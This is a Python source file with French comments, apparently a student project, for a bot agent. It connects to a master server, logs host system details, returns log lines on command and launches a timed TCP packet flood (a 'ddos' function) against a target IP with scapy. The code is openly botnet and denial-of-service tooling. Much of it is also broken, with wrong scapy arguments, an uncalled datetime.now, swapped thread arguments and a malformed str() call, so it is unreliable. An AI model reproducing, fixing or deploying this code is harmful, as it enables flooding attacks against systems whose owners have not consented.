import subprocess
import threading
from _multiprocessing import send

#import shed    #pour le schedule
import time
import datetime
from datetime import datetime
import socket
import os
import sys
import logging      #pour la journalisation
import platform   #pour prendre des infos systeme
from scapy.all import *     #pour ddos
from scapy.layers.inet import IP
from scapy.layers.http import *


#        arguments à déclarer (listes etc)
from scapy.layers.inet import TCP

temoinLog = False
fichierLog = 'InfosSysteme.log'
get_log_result = []

#         FONCTIONS

def start_log ():

    global fichierLog
    global TemoinLog
    TemoinLog = True
    logging.basicConfig(filename=fichierLog, format='%(asctime)s %(message)s', level=logging.INFO)
#         les infos de plateforme:
    logging.info("*" * 20, "Informations du systeme", "*" * 20, "\n")
    hostname = socket.gethostname()
    logging.info(f"Nom d'hôte : ", hostname)
    logging.info(f"Interface IP : ", socket.gethostbyname(hostname))
    uname = platform.uname()
    logging.info(f"Systeme: {uname.system}")
    logging.info(f"Nom de noeud: {uname.node}")
    logging.info(f"Release: {uname.release}")
    logging.info(f"Version: {uname.version}")
    logging.info(f"Machine: {uname.machine}")
    logging.info(f"Processeur: {uname.processor}")

    return True


def stop_log ():
    global temoinLog
    if (temoinLog is True):
        logging.shutdown()
        return True
    else:
        return False




def longueurfichier (nomfichier):
    j = 0
    with open(nomfichier) as f:
        for j, l in enumerate(f):
            pass
    return j




def get_log (ligneRenvoi):

    global fichierLog
    listeLignes = []
    i = 0
    nbrLignes = longueurfichier(fichierLog)
    with open(fichierLog) as fp:
        ligne = fp.readline()
        compteur_lignes = 1
        while ligne:
            ligne = fp.readline()
            if (compteur_lignes > (nbrLignes - ligneRenvoi)):
                    listeLignes[i] = ligne
                    i+= 1
            compteur_lignes += 1

    return listeLignes

def ddos (attack_time, target_ip):
    nomHote= socket.gethostname()
    source_ip = socket.gethostbyname(nomHote)
    source_port = 90
    now = datetime.now
    temps_actuel = now.strftime("%Y/%m/%d %H:%M%S")
    if temps_actuel == attack_time:
        for d in range(0, 100):
            IP1 = IP(source_IP=source_ip, destination = target_ip)
            TCP1 = TCP(srcport=source_port, dstport = 80)
            pkt = IP1 / TCP1
            send(pkt, inter=.002)
            print("\npaquet num  ", d, " / 100  envoye ")



#             connexion au serv via socket + bouclage
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = '127.0.0.1'
        port = 9999
        s.connect((host, port))

        while True:
            global run
            data = s.recv(1024)  #taille buffer pour les messages
            data=data[:].decode("utf-8")
            data = data.lower()  #tout en minuscules

            data_list = data.split(" ")

#                                                               appel des fonctions et renvoi au master via un s.send

            if "start_log" == data_list[1]: #fonctionne en créeant un fichier log dans le dossier
                start_log()
                s.send(str.encode("log crée"))

            elif "stop_log" == data_list[1]:   #         ne fonctionne pas (retour difficile)
                etat = stop_log()
                if etat is True:
                    s.send(str.encode("stop log"))
                else:
                    s.send(str.encode("\nAucun logging lançé\n"))

            elif "ping" == data_list[1]:
                s.send(str.encode("Pong"))

            elif "get_log" == data_list[1]:
                nombre_lignes = int(data_list[2])
                get_log_result = get_log(nombre_lignes)       #mets les x dernieres lignes de log dans une liste de string
                s.send(str.encode("Log lines incoming"))
                for i in range(0, nombre_lignes):
                    s.send(str.encode(get_log_result[i]))     #envoie chaque string de la liste au master

            elif "ddos" == data_list[1]:
                jour_list = data_list[3].split(";")
                heure_list = data_list[4].split(";")
                temps_attaque = str(jour_list[3], '/',  jour_list[2], '/',  jour_list[1], ' ', heure_list[1], ':', heure_list[2], ':', heure_list[3])
                t = threading.Thread(target=ddos, args=(data_list[2],temps_attaque,))
                t.start()






            else:
                s.send(str.encode("ERREUR"))
    except: #exception pas terminée mais fonctionnelle
        continue


